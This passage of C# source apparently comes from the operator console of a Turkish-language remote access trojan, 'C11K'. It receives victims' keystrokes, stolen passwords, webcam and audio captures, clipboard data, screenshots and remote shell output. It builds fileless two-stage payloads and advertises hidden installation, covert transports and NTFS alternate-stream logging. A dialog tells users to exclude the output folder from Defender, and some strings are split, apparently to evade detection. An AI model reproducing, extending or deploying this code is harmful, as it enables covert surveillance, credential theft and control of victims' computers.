            _clients.LblCrypto.ForeColor = string.IsNullOrEmpty(_mgr.AesKey) ? Theme.Current.Muted : Theme.Current.Ok;

            if (_clients.ChipOnline != null) _clients.ChipOnline.Text = "Çevrimiçi " + total;
            if (_clients.ChipAdmin != null) _clients.ChipAdmin.Text = "Admin " + admins;
            if (_clients.ChipAes != null)
            {
                _clients.ChipAes.Text = string.IsNullOrEmpty(_mgr.AesKey) ? "AES kapalı" : "AES açık";
                _clients.ChipAes.ForeColor = string.IsNullOrEmpty(_mgr.AesKey) ? Theme.Current.Muted : Theme.Current.Warn;
            }

            if (_statLine != null)
                _statLine.Text = "toplam  " + total + "\nadmin   " + admins + "\nonline  " + total + "\n\nv2.0.2";

            if (_settings != null)
            {
                if (_mgr.Listening)
                {
                    _clients.LblState.Text = "Dinleniyor: " + _mgr.Port;
                    _clients.LblState.ForeColor = Theme.Current.Ok;
                    if (_settings.LblStatus != null)
                    {
                        _settings.LblStatus.Text = "Durum: Dinleniyor (" + _mgr.Port + ")";
                        _settings.LblStatus.ForeColor = Theme.Current.Ok;
                    }
                    _settings.BtnListen.Text = "Durdur";
                    _settings.BtnListen.Palette(Theme.Current.Bad, Color.White);
                    _settings.TxtPort.Enabled = false;
                }
                else
                {
                    _clients.LblState.Text = "Dinlenmiyor";
                    _clients.LblState.ForeColor = Theme.Current.Text;
                    if (_settings.LblStatus != null)
                    {
                        _settings.LblStatus.Text = "Durum: Kapalı";
                        _settings.LblStatus.ForeColor = Theme.Current.Muted;
                    }
                    _settings.BtnListen.Text = "Dinle";
                    _settings.BtnListen.Palette(Theme.Current.Accent, Color.White);
                    _settings.TxtPort.Enabled = true;
                }

                if (_settings.LblKey != null)
                    _settings.LblKey.Text = string.IsNullOrEmpty(_mgr.AesKey)
                        ? "Anahtar: yok (şifresiz)"
                        : "Anahtar: " + new string('•', Math.Min(12, _mgr.AesKey.Length));
            }

            if (_builder != null && _builder.LblMemStatus != null)
            {
                int n = LoaderBin.Status.Count;
                string depo = LoaderBin.HasStage1 ? ("Stage1 " + LoaderBin.GetLatestStage1().Length + "B") : "boş";
                _builder.LblMemStatus.Text = "Depo: " + depo + (n > 0 ? "\nSon: " + LoaderBin.Status.OrderByDescending(k => k.Value).First().Value : "");
            }
        }

        void PingAll()
        {
            foreach (var kv in _mgr.Sessions)
            {
                kv.Value.EchoSent = Environment.TickCount;
                _mgr.Send(kv.Key, "ECHO|" + kv.Value.EchoSent);
            }
        }

        void Log(string msg)
        {
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { Log(msg); }); } catch { } return; }
            if (IsDisposed || _logs == null) return;

            Color c = msg.StartsWith("Bağlandı", StringComparison.Ordinal) ? Theme.Current.Ok
                    : (msg.IndexOf("hata", StringComparison.OrdinalIgnoreCase) >= 0
                       || msg.IndexOf("Uyarı", StringComparison.OrdinalIgnoreCase) >= 0
                       || msg.IndexOf("Engelli", StringComparison.OrdinalIgnoreCase) >= 0) ? Theme.Current.Warn
                    : Theme.Current.Text;

            _logs.Append(DateTime.Now, msg, c);
        }

        void ShowToast(string title, string text, Color accent)
        {
            try { new Toast(title, text, accent).Show(); } catch { }
        }

        void HandleChat(string sid, string text)
        {
            var s = Find(sid);
            if (s == null) return;

            ChatForm f;
            if (!ModuleRegistry.TryGet(sid, out f))
            {
                string name = Storage.Read("op_na" + "me.txt").Trim();
                if (name.Length == 0) name = "Operatör";

                f = new ChatForm();
                f.Initialize(s, Sender(sid));
                f.SetOperator(name);
                ModuleRegistry.Add(sid, f);
                f.Show();

                ShowToast("Sohbet", Ui.Alias(s.UserPc) + " yazıyor", Theme.Current.Accent);
            }
            f.AppendPeer(text);
        }

        void OnLogData(string sid, string b64)
        {
            ClientSession s;
            _mgr.Sessions.TryGetValue(sid, out s);

            string text = null;
            try
            {
                var c = s != null ? Protocol.Crypto(s.Key) : null;
                if (c != null) text = c.Decrypt(Convert.FromBase64String(b64));
            }
            catch { }

            if (text == null)
            {
                try { text = Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }
                catch { text = b64; }
            }
            if (string.IsNullOrEmpty(text)) return;

            string who = s != null ? s.UserPc : sid;
            string ip = s != null ? s.Ip : "?";

            Ads.Append("----- " + who + " (" + ip + ") | " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " -----\r\n" + text + "\r\n");

            int n = 0;
            foreach (var _ in text.Split('\n')) n++;
            Log("Log alındı (" + n + " satır) ← " + who);
        }

        void MessageIn(string sid, string msg)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { MessageIn(sid, msg); }); } catch { } return; }
            if (string.IsNullOrEmpty(msg)) return;

            try { _bot.Feed(sid, msg); } catch { }

            try
            {
                char k = msg[0];

                if (k == 'L' && msg.StartsWith("LOG|DATA|", StringComparison.Ordinal)) { OnLogData(sid, msg.Substring(9)); return; }

                if (k == 'E' && msg.StartsWith("ECHO|", StringComparison.Ordinal))
                {
                    ClientSession s;
                    if (_mgr.Sessions.TryGetValue(sid, out s) && s.EchoSent > 0)
                    {
                        int ms = unchecked(Environment.TickCount - (int)s.EchoSent);
                        if (ms >= 0 && ms < 60000) { s.Rtt = ms; _clients.Grid.UpdateRow(sid); }
                    }
                    return;
                }

                if (k == 'S')
                {
                    if (msg.StartsWith("SHOT|", StringComparison.Ordinal)) { OnShot(sid, msg); return; }
                    if (msg.StartsWith("SHELL_OUT|", StringComparison.Ordinal)) { TerminalForm f; if (ModuleRegistry.TryGet(sid, out f)) f.Append(msg.Substring(10)); return; }
                    if (msg.StartsWith("SCRIPT_OUT|", StringComparison.Ordinal)) { ScriptForm f; if (ModuleRegistry.TryGet(sid, out f)) f.SetOutput(msg.Substring(11)); return; }
                    if (msg.StartsWith("SYSINFO_OUT|", StringComparison.Ordinal)) { SystemInfoForm f; if (ModuleRegistry.TryGet(sid, out f)) f.UpdateInfo(msg.Substring(12)); return; }
                    if (msg.StartsWith("STARTUP_OUT|", StringComparison.Ordinal)) { StartupManagerForm f; if (ModuleRegistry.TryGet(sid, out f)) f.UpdateStartup(msg.Substring(12)); return; }
                    if (msg.StartsWith("SEARCH_OUT|", StringComparison.Ordinal)) { InfoTextForm f; if (ModuleRegistry.TryGet(sid, out f)) f.Set(msg.Substring(11)); return; }
                    if (msg.StartsWith("SOFT_OUT|", StringComparison.Ordinal)) { InfoTextForm f; if (ModuleRegistry.TryGet(sid, out f)) f.Set(msg.Substring(9)); return; }
                    return;
                }

                if (k == 'I')
                {
                    if (msg.StartsWith("IMG|", StringComparison.Ordinal))
                    {
                        string[] p = msg.Substring(4).Split(new[] { '|' }, 3);
                        DesktopViewerForm f;
                        if (p.Length == 3 && ModuleRegistry.TryGet(sid, out f))
                        {
                            int w, h;
                            if (int.TryParse(p[0], out w) && int.TryParse(p[1], out h)) f.UpdateFrame(w, h, p[2]);
                        }
                        return;
                    }
                    if (msg.StartsWith("INFO|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(5);
                        Log(UserPc(sid) + ": " + body);
                        ShowToast("Bilgi", body, Theme.Current.Accent);
                        return;
                    }
                    return;
                }

                if (k == 'C')
                {
                    if (msg.StartsWith("CAM_IMG|", StringComparison.Ordinal))
                    {
                        CamForm f;
                        if (!ModuleRegistry.TryGet(sid, out f))
                        {
                            var sess = Find(sid);
                            if (sess != null) { ModuleRegistry.Open<CamForm>(sess, Sender(sid)); ModuleRegistry.TryGet(sid, out f); }
                        }
                        if (f != null) f.UpdateImage(msg.Substring(8));
                        return;
                    }
                    if (msg.StartsWith("CAM_ERR|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(8);
                        CamForm f;
                        if (ModuleRegistry.TryGet(sid, out f)) f.SetStatus(body);
                        else MessageBox.Show(body, "Kamera", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                    if (msg.StartsWith("CHAT|MSG|", StringComparison.Ordinal))
                    {
                        HandleChat(sid, B64D(msg.Substring(9)));
                        return;
                    }
                    if (msg.StartsWith("CHAT|", StringComparison.Ordinal))
                    {
                        HandleChat(sid, msg.Substring(5));
                        return;
                    }
                    if (msg.StartsWith("CLIP|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(5);
                        ClipboardForm f;
                        if (ModuleRegistry.TryGet(sid, out f)) f.Append(B64D(body));
                        return;
                    }
                    return;
                }

                if (k == 'F')
                {
                    if (msg.StartsWith("FILE_LIST|", StringComparison.Ordinal)) { FileManagerForm f; if (ModuleRegistry.TryGet(sid, out f)) f.UpdateFiles(msg.Substring(10)); return; }
                    if (msg.StartsWith("FILE_MSG|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(9);
                        FileManagerForm f;
                        if (ModuleRegistry.TryGet(sid, out f)) { f.Notify(body); f.RefreshList(); } else Log(body);
                        return;
                    }
                    if (msg.StartsWith("FILE_ERR|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(9);
                        FileManagerForm f;
                        if (ModuleRegistry.TryGet(sid, out f)) f.Notify(body);
                        else MessageBox.Show(body, "Dosya Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    if (msg.StartsWith("FILE_DATA|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(10);
                        int j = body.IndexOf('|');
                        FileManagerForm f;
                        if (j > 0 && ModuleRegistry.TryGet(sid, out f)) f.SaveDownload(body.Substring(0, j), body.Substring(j + 1));
                        return;
                    }
                    return;
                }

                if (k == 'P')
                {
                    if (msg.StartsWith("PROC_LIST|", StringComparison.Ordinal)) { TaskManagerForm f; if (ModuleRegistry.TryGet(sid, out f)) f.UpdateProcesses(msg.Substring(10)); return; }
                    if (msg.StartsWith("PASS_OUT|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(9);
                        PasswordForm f;
                        if (ModuleRegistry.TryGet(sid, out f))
                        {
                            string text;
                            try { text = Encoding.UTF8.GetString(Convert.FromBase64String(body)); } catch { text = body; }
                            f.UpdatePasswords(text);
                        }
                        return;
                    }
                    return;
                }

                if (k == 'A')
                {
                    if (msg.StartsWith("AUDIO_DATA|", StringComparison.Ordinal))
                    {
                        string body = msg.Substring(11);
                        using (var sfd = new SaveFileDialog { FileName = "kayit_" + DateTime.Now.ToString("HHmmss") + ".wav", Filter = "WAV|*.wav" })
                        {
                            if (sfd.ShowDialog() != DialogResult.OK) return;
                            try
                            {
                                File.WriteAllBytes(sfd.FileName, Convert.FromBase64String(body));
                                MessageBox.Show("Kaydedildi:\n" + sfd.FileName, "Ses");
                            }
                            catch (Exception ex) { MessageBox.Show(ex.Message, "Hata"); }
                        }
                        return;
                    }
                    if (msg.StartsWith("AUDIO_ERR|", StringComparison.Ordinal))
                    {
                        MessageBox.Show(msg.Substring(10), "Ses Kaydı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                    return;
                }

                if (k == 'D' && msg.StartsWith("DRIVES_OUT|", StringComparison.Ordinal))
                {
                    InfoTextForm f;
                    if (ModuleRegistry.TryGet(sid, out f)) f.Set(msg.Substring(11));
                    return;
                }

                if (k == 'E' && msg.StartsWith("ENV_OUT|", StringComparison.Ordinal))
                {
                    InfoTextForm f;
                    if (ModuleRegistry.TryGet(sid, out f)) f.Set(msg.Substring(8));
                    return;
                }

                if (k == 'H' && msg.StartsWith("HOSTS_OUT|", StringComparison.Ordinal))
                {
                    InfoTextForm f;
                    if (ModuleRegistry.TryGet(sid, out f)) f.Set(msg.Substring(10));
                    return;
                }

                if (k == 'R' && msg.StartsWith("REG_OUT|", StringComparison.Ordinal))
                {
                    RegistryEditorForm f;
                    if (ModuleRegistry.TryGet(sid, out f)) f.UpdateRegistry(msg.Substring(8));
                    return;
                }

                if (k == 'K' && msg.StartsWith("KEYLOG|", StringComparison.Ordinal))
                {
                    InputMonitorForm f;
                    if (ModuleRegistry.TryGet(sid, out f)) f.AppendKey(msg.Substring(7));
                }
            }
            catch { }
        }

        void OnShot(string sid, string msg)
        {
            string[] p = msg.Split(new[] { '|' }, 4);
            if (p.Length != 4) return;
            try
            {
                ClientSession s;
                if (!_mgr.Sessions.TryGetValue(sid, out s)) return;

                Image img;
                using (var ms = new MemoryStream(Convert.FromBase64String(p[3]))) img = Image.FromStream(ms);

                int sw = Math.Max(1, img.Width), sh = Math.Max(1, img.Height);
                var box = new Rectangle(0, 0, 148, 88);
                var fit = Ui.Fit(box, sw, sh);

                var bmp = new Bitmap(box.Width, box.Height);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.Clear(Theme.Current.Title);
                    g.InterpolationMode = InterpolationMode.HighQualityBilinear;
                    g.DrawImage(img, fit);
                }
                img.Dispose();

                var old = s.Thumb;
                s.Thumb = bmp;
                if (old != null) old.Dispose();

                _clients.Grid.UpdateRow(sid);
                if (SelectedSession() == s) UpdateDrawer();
            }
            catch { }
        }

        ClientSession Find(string sid)
        {
            ClientSession s;
            return _mgr.Sessions.TryGetValue(sid, out s) ? s : null;
        }

        string UserPc(string sid)
        {
            ClientSession s;
            if (_mgr.Sessions.TryGetValue(sid, out s)) return s.UserPc;
            return sid ?? "";
        }

        void ToggleListen()
        {
            if (_mgr.Listening) { _mgr.Stop(); UpdateStatus(); return; }

            int port;
            if (!int.TryParse(_settings.TxtPort.Text.Trim(), out port) || port < 1 || port > 65535)
            {
                MessageBox.Show("Geçerli bir port gir (1-65535).", "Hatalı Port", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            _mgr.AesKey = _builder.ChkAes.Checked ? _builder.TxtAes.Text : "";
            if (!_mgr.Start(port))
                MessageBox.Show("Port dinlenemedi. Başka bir uygulama kullanıyor olabilir.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);

            if (_mgr.Listening) WakeUpAll();
            UpdateStatus();
        }

        void DoBuild()
        {
            BuildConfig cfg;
            try { cfg = _builder.Collect(); }
            catch (Exception ex) { MessageBox.Show(ex.Message, "Eksik Ayar", MessageBoxButtons.OK, MessageBoxIcon.Warning); return; }

            string outPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), cfg.OutputName);

            _builder.BtnBuild.Enabled = false;
            _builder.BtnBuild.Spinning = true;
            _builder.LblStatus.ForeColor = Theme.Current.Warn;
            _builder.LblStatus.Text = "Derleniyor...";
            Application.DoEvents();

            bool missing = false;

            try
            {
                Builder.Build(cfg, outPath, m =>
                {
                    _builder.LblStatus.Text = m;
                    Application.DoEvents();
                });

                if (!File.Exists(outPath))
                {
                    missing = true;
                    _builder.LblStatus.ForeColor = Theme.Current.Bad;
                    _builder.LblStatus.Text = "Defender dosyayı sildi";
                }
                else
                {
                    _builder.LblStatus.ForeColor = Theme.Current.Ok;
                    _builder.LblStatus.Text = "Tamam: " + outPath;

                    if (cfg.MemoryOnly)
                    {
                        int n = LoaderBin.HasStage1 ? LoaderBin.GetLatestStage1().Length : 0;
                        _builder.LblMemStatus.Text = "Depo: Stage1 " + n + "B (build)";
                    }

                    if (MessageBox.Show("Çıktı oluşturuldu:\n" + outPath + "\n\nKlasörü açayım mı?", "Başarılı", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                        Process.Start("explo" + "rer.exe", "/select,\"" + outPath + "\"");
                }
            }
            catch (Exception ex)
            {
                _builder.LblStatus.ForeColor = Theme.Current.Bad;
                _builder.LblStatus.Text = "Derleme hatası";
                MessageBox.Show(ex.Message, "Derleme Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                _builder.BtnBuild.Spinning = false;
                _builder.BtnBuild.Enabled = true;
            }

            if (!missing) return;

            string folder = Path.GetDirectoryName(outPath);
            MessageBox.Show(
                "Defender dosyayı derleme biter bitmez sildi.\n\n" +
                "Kalıcı çözüm: bu klasörü muafiyete ekle.\n\n" +
                "Windows Güvenliği > Virüs ve tehdit koruması >\n" +
                "Ayarları yönet > Dışlamalar > Dışlama ekle > Klasör\n\n" +
                "Klasör: " + folder + "\n\n" +
                "Muafiyet ekledikten sonra tekrar derle.",
                "Defender dosyayı sildi",
                MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        string Input(string label, string def)
        {
            using (var f = new Form())
            {
                f.Text = "Girdi";
                f.Size = new Size(424, 144);
                f.FormBorderStyle = FormBorderStyle.FixedDialog;
                f.StartPosition = FormStartPosition.CenterParent;
                f.BackColor = Theme.Current.Main;
                f.ForeColor = Theme.Current.Text;
                f.Font = Ui.F(9f);

                var l = new Label { Text = label, Left = 16, Top = 14, AutoSize = true };
                var t = new TextBox { Left = 16, Top = 38, Width = 380, Text = def, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore };
                var ok = new PillButton { Text = "Tamam", Left = 292, Width = 104, Top = 72, DialogResult = DialogResult.OK, Radius = 6 };
                ok.Palette(Theme.Current.Accent, Color.White);

                f.Controls.Add(l);
                f.Controls.Add(t);
                f.Controls.Add(ok);
                f.AcceptButton = ok;

                return f.ShowDialog() == DialogResult.OK ? t.Text : null;
            }
        }

        void ShowPanel(Control target)
        {
            if (_clients == null || target == null) return;

            _clients.Visible = false;
            if (_builder != null) _builder.Visible = false;
            if (_settings != null) _settings.Visible = false;
            if (_logs != null) _logs.Visible = false;

            target.Visible = true;
            target.BringToFront();
            if (ReferenceEquals(target, _clients)) { RefreshList(); UpdateDrawer(); }

            int baseX = RailWidth + 1;
            int baseW = Width - RailWidth - 2;

            if (_slide != null) { _slide.Stop(); _slide.Dispose(); _slide = null; }

            target.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left;
            target.SetBounds(baseX - 18, S(TitleHeight) + 1, baseW, Height - S(TitleHeight) - 2);

            int step = 0;
            _slide = new System.Windows.Forms.Timer { Interval = 15 };
            _slide.Tick += (s, e) =>
            {
                step++;
                target.Left = baseX - 18 + (int)(18.0 * step / 10.0);
                if (step < 10) return;
                _slide.Stop();
                target.SetBounds(baseX, S(TitleHeight) + 1, baseW, Height - S(TitleHeight) - 2);
                target.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
                _slide.Dispose();
                _slide = null;
            };
            _slide.Start();

            Invalidate(true);
        }

        Label Link(Control parent, string caption, string text, string url, int x, int y)
        {
            parent.Controls.Add(new Label
            {
                Text = caption,
                Left = x,
                Top = y + 2,
                Width = 62,
                TextAlign = ContentAlignment.MiddleRight,
                ForeColor = Theme.Current.Muted,
                BackColor = Color.Transparent,
                Font = Ui.F(8f)
            });

            var l = new Label
            {
                Text = text,
                Left = x + 68,
                Top = y,
                AutoSize = true,
                ForeColor = Theme.Current.Accent,
                BackColor = Color.Transparent,
                Font = Ui.F(9f, string.IsNullOrEmpty(url) ? FontStyle.Regular : FontStyle.Underline),
                Cursor = string.IsNullOrEmpty(url) ? Cursors.Default : Cursors.Hand
            };

            if (!string.IsNullOrEmpty(url))
            {
                l.Click += (s, e) => { try { Process.Start(url); } catch { } };
                l.MouseEnter += (s, e) => l.ForeColor = Theme.Current.Text;
                l.MouseLeave += (s, e) => l.ForeColor = Theme.Current.Accent;
            }

            parent.Controls.Add(l);
            return l;
        }

        void ShowAbout()
        {
            using (var f = new ModuleForm("Hakkında"))
            {
                f.Size = new Size(580, 520);
                f.MinimumSize = f.Size;
                f.MaximizeBox = false;

                var card = new BufferedPanel { Dock = DockStyle.Fill, BackColor = Theme.Current.Main };
                f.Body.Controls.Add(card);

                card.Controls.Add(new Panel { Dock = DockStyle.Top, Height = 4, BackColor = Theme.Current.Accent });

                card.Controls.Add(new Label
                {
                    Text = "C11" + "K",
                    Left = 32,
                    Top = 24,
                    AutoSize = true,
                    BackColor = Color.Transparent,
                    Font = Ui.F(24f, FontStyle.Bold),
                    ForeColor = Theme.Current.Accent
                });

                card.Controls.Add(new Label
                {
                    Text = "v2.0.2",
                    Left = 152,
                    Top = 42,
                    Size = new Size(56, 20),
                    TextAlign = ContentAlignment.MiddleCenter,
                    BackColor = Theme.Current.Card,
                    ForeColor = Theme.Current.Muted,
                    Font = Ui.F(7.5f, FontStyle.Bold)
                });

                card.Controls.Add(new Label
                {
                    Text = "Deniz tarafından yapıldı.",
                    Left = 32,
                    Top = 72,
                    AutoSize = true,
                    BackColor = Color.Transparent,
                    Font = Ui.F(9.5f, FontStyle.Bold),
                    ForeColor = Theme.Current.Text
                });

                card.Controls.Add(new Label
                {
                    Text = "Uzaktan yönetim aracı — C# WinForms, tek dosya, harici bağımlılık yok.\n" +
                           "AES-256-CBC + HMAC • PBKDF2(40k) • oturum tuzu • gizli kurulum\n" +
                           "WebSocket/TLS/TCP/DNS taşıma • mod yedekleme • jitter • NTFS ADS log\n" +
                           "İki aşamalı taşıyıcı: disk'e modül yazmadan bellekten çalışma",
                    Left = 32,
                    Top = 96,
                    Width = 510,
                    Height = 70,
                    BackColor = Color.Transparent,
                    ForeColor = Theme.Current.Muted,
                    Font = Ui.F(8f)
                });

                card.Controls.Add(new Panel { Left = 32, Top = 174, Width = 510, Height = 1, BackColor = Theme.Current.Border });

                card.Controls.Add(new Label
                {
                    Text = "YETENEKLER",
                    Left = 32,
                    Top = 186,
                    AutoSize = true,
                    BackColor = Color.Transparent,
                    Font = Ui.F(7f, FontStyle.Bold),
                    ForeColor = Theme.Current.Muted
                });

                card.Controls.Add(new Label
                {
                    Text = "Masaüstü kontrolü • dosya yöneticisi (sürükle-bırak + parça) • terminal • script\n" +
                           "webcam • ses kaydı • sohbet • input monitor • pano • kayıt defteri • başlangıç\n" +
                           "süreç yönetimi • tam ekran kilit • Telegram botu • sunucu tarafı veri toplama",
                    Left = 32,
                    Top = 206,
                    Width = 510,
                    Height = 72,
                    BackColor = Color.Transparent,
                    ForeColor = Theme.Current.Text,
                    Font = Ui.F(8f)
                });

                card.Controls.Add(new Label
                {
                    Text = "İLETİŞİM",
                    Left = 32,
                    Top = 286,
                    AutoSize = true,
                    BackColor = Color.Transparent,
                    Font = Ui.F(7f, FontStyle.Bold),
                    ForeColor = Theme.Current.Muted
                });

                Link(card, "Discord", DiscordTag, "", 32, 306);
                Link(card, "GitHub", "bana tıkla", GithubUrl, 32, 330);

                card.Controls.Add(new Label
                {
                    Text = "Arayüz fikirleri için Pulsar (DeEpinGh0st) projesine teşekkürler.",
                    Left = 32,
                    Top = 372,
                    Width = 510,
                    Height = 18,
                    BackColor = Color.Transparent,
                    ForeColor = Theme.Current.Muted,
                    Font = Ui.F(7.5f)
                });

                var ok = new PillButton { Text = "Kapat", Size = new Size(112, 30), Left = 432, Top = 404, Radius = 7 };
                ok.Palette(Theme.Current.Accent, Color.White);
                ok.Click += (s, e) => f.Close();
                card.Controls.Add(ok);

                f.ShowDialog(this);
            }
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            var g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            using (var path = Ui.Round(new Rectangle(0, 0, Math.Max(1, Width - 1), Math.Max(1, Height - 1)), S(10)))
            using (var p = new Pen(Theme.Current.Border)) g.DrawPath(p, path);

            using (var p = new Pen(Theme.Current.Border))
                g.DrawLine(p, RailWidth, S(TitleHeight), RailWidth, Height);
        }

        public override void ApplyTheme()
        {
            base.ApplyTheme();
            if (_clients != null) _clients.ApplyTheme();
            if (_settings != null) _settings.ApplyTheme();
            if (_builder != null) _builder.ApplyTheme();
            if (_logs != null) _logs.ApplyTheme();

            ModuleRegistry.ApplyThemeAll();

            foreach (var rb in new[] { _btnClients, _btnBuilder, _btnSettings, _btnLogs, _btnAbout })
            {
                if (rb == null) continue;
                rb.ApplyTheme();
            }
            if (_activeBtn != null) _activeBtn.SetActive(true);
            if (_statLine != null) _statLine.ForeColor = Theme.Current.Muted;
            if (_rail != null) _rail.BringToFront();

            BuildContextMenu();
            UpdateStatus();
            Invalidate(true);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            try { if (_pingTimer != null) _pingTimer.Stop(); } catch { }
            try { if (_slide != null) { _slide.Stop(); _slide.Dispose(); _slide = null; } } catch { }
            try { _bot.Stop(); } catch { }
            SaveKnown(true);

            foreach (var kv in _mgr.Sessions)
            {
                try { if (kv.Value.Thumb != null) { kv.Value.Thumb.Dispose(); kv.Value.Thumb = null; } } catch { }
            }
            foreach (var kv in _known)
            {
                try { if (kv.Value.Thumb != null) { kv.Value.Thumb.Dispose(); kv.Value.Thumb = null; } } catch { }
            }

            _mgr.Stop();
            base.OnFormClosing(e);
        }
    }
}